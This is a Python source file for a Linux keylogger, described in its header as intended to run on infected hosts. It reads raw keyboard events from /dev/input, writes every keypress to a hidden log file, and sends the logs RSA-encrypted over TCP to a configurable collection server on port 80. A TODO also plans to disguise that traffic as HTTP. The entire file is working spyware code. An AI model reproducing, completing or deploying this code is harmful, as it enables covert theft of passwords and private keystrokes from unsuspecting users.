import re
import struct
import os
import socket
import traceback
import json
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from datetime import datetime

"""
Basic keylogger program using regex, file IO and linux event handlers.
Can be frozen using PyInstaller to run on infected hosts without python installation.
Written by mowemcfc (jcartermcfc@gmail.com) starting 12/06/2020
"""

return_addr = ("192.168.0.14", 80) # configure this to match the IP your server will run on. port 80 is HTTP so will most likely be always open.
logfile_name = ".log.txt"

# dict of code:key pairs corresponding to keyboard entry codes found in /include/linux/input-event-codes.h
# TODO: by-country keyboard layout, need way to determine location? 
# TODO: shift-augmented keys? does this matter?
# TODO: BUGFIX BUGFIX BUGFIX, THIS IS VERY BROKEN
qwerty_map = {
    1:"[ESC]", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
    11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "q", 17: "w",
    18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "[",
    27: "]", 28: "[RETURN]", 29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
    35: "h", 36: "j", 37: "k", 38: "l", 39: ";", 40: "'", 41: "`", 42: "[SHIFT]",
    43: "[BACKSLASH]", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
    51: ",", 52: ".", 53: "/", 54: "[SHIFT]", 55: "FN", 56: "ALT", 57: " ", 58: "[CAPSLOCK]",
    59: "[F1]", 60: "[F2]", 61: "[F3]", 62: "[F4]", 63: "[F5]", 64: "[F6]", 65: "[F7]",
    66: "[F8]", 67: "[F9]", 68: "[F10]", 71: "7", 72: "8", 73: "9", 74: "-", 75: "4",
    76: "5", 77: "KP6", 78: "+", 79: "1", 80: "2", 81: "3", 82: "0", 83: ".",
    87: "[F11]", 88: "[F12]"
}

class Packet:
    def __init__(self):
        self.type = ""
        self.time = datetime.now().strftime("%H:%M:%S")
        self.data = ""

"""
Find character device file associated with keypress events using regex and device information.
"""
# TODO: dynamic pathfinding to account for different filesystem structures
def get_kb_cfile():
    with open("/proc/bus/input/devices", "r") as f: # this file contains current device information, including the keyboard
        lines = f.readlines()

        pattern  = re.compile("Handlers|EV=")
        handlers = list(filter(pattern.search, lines))

        pattern = re.compile("EV=120013") # 120013 is the 'minimum' bitmask for keyboard events TODO: other bitmasks? different regex?

        for idx, elt in enumerate(handlers): # search handlers list for the event bitmask, returning the value before this which is the
            if pattern.search(elt):          # name of the event file
                line = handlers[idx-1]

        pattern = re.compile("event\d?[0-9]|[1-9]0")
        cfile_path = "/dev/input/" + pattern.search(line).group(0) # find character device file event#

        f.close()

    return cfile_path

"""
Takes name of logfile and last 128 typed characters as input, and sends contents over TCP connection.
Clears file's contents after read.
"""
def send_logfile(sock, pub_key):
    with open(logfile_name, "r+") as outf: # read/write mode
        data = ''.join(outf.readlines())

        if data:
            out_packet = Packet()
            out_packet.type = "KEYPRESS_DATA"
            out_packet.data = data

            out_packet_string = json.dumps(out_packet.__dict__)
            out_packet_bytes = out_packet_string.encode()

            out_packet_cipher = pub_key.encrypt(
                out_packet_bytes,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            sock.sendall(out_packet_cipher)

        outf.truncate(0)
        outf.close()   

    return

"""
Takes name of logfile and last 128 typed characters as input and writes to logfile.
"""
def write_to_logfile(typed):
    with open(logfile_name, "a") as outf: # append mode
        outf.write(typed)
        outf.close()

    return

"""
Requests RSA public key from server and returns it
"""
def request_key(sock):

    pub_key = None

    request = Packet()
    request.type = "KEY_REQ"

    requestStr = json.dumps(request.__dict__)
    sock.sendall(requestStr.encode("utf-8"))

    response = sock.recv(1024).decode("utf-8")
    response_dict = json.loads(response)
    
    if(response_dict["type"] == "PUB_KEY"):
        pub_key_bytes = response_dict["data"].encode()
        pub_key = load_pem_public_key(pub_key_bytes, backend=default_backend())

    return pub_key


"""
Attempts to establish tcp connection with source PC using (HOST, PORT) tuple return_addr
If exception is raised (aka connection could not be made, for whatever reason), we ignore,
data will be written to file instead.
"""
def try_connect_socket(sock, return_addr):
    try:
        print("attempting to connect to host", return_addr)
        sock.connect(return_addr)
        print("successfully connected to host", return_addr)
        print("asking host server for public key")
        pub_key = request_key(sock)
        print("public key received")
        return pub_key   
    except:
        traceback.print_exc()
        pass

"""
Opens special character file associated with keyboard events, reads struct and writes to output file.
Takes path to keypress' device character file as input.

Struct format {struct input_event} is as follows (for 64bit linux systems):
    struct input_event {
        long int tv_sec
        long int tv_sec
        __u16 type;
        __u16 code;
        __s32 value;
    }
"""
# TODO: encrypt outgoing data
# TODO: mask connection as web server with http
def read_cfile(cfile_path, device_file):
    inevent_struct_format = 'llHHI'
    struct_size = struct.calcsize(inevent_struct_format)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    pub_key = try_connect_socket(sock, return_addr)

    keypress = device_file.read(struct_size)

    typed = ""

    while keypress:
        (var1, var2, type, code, value) = struct.unpack(inevent_struct_format, keypress)
        #print(var1, var2, type, code, value)

        if sock.fileno() == -1: # If socket is not connected, attempt to reconnect, otherwise ignore - data will be written to file
            print("not currently connected, attempting to reconnect")
            pub_key = try_connect_socket(sock, return_addr)

        if code != 0 and type == 1 and value == 1: # TODO: write this comment
            if code in qwerty_map:
                typed += qwerty_map[code]

        keypress = device_file.read(struct_size)           
        if len(typed) == 128:
            print("----WRITING----")
            try:
                write_to_logfile(typed)
                typed = "" # clear input buffer to avoid double handling when exceptions occur
                send_logfile(sock, pub_key)
            except:
                traceback.print_exc()
                pass

"""
Creates file pointers device_file (for keypress reading) and creates logfile for writing 
Returns device_file
"""
def file_init(cfile_path):
    logfile = open(logfile_name, "w") # Create/wipe logfile for instance of program
    logfile.close() 

    device_file = open(cfile_path, "rb")

    return device_file

def main():
    cfile_path = get_kb_cfile()

    device_file = file_init(cfile_path)

    read_cfile(cfile_path, device_file)

    device_file.close()

if __name__ == "__main__":
    main()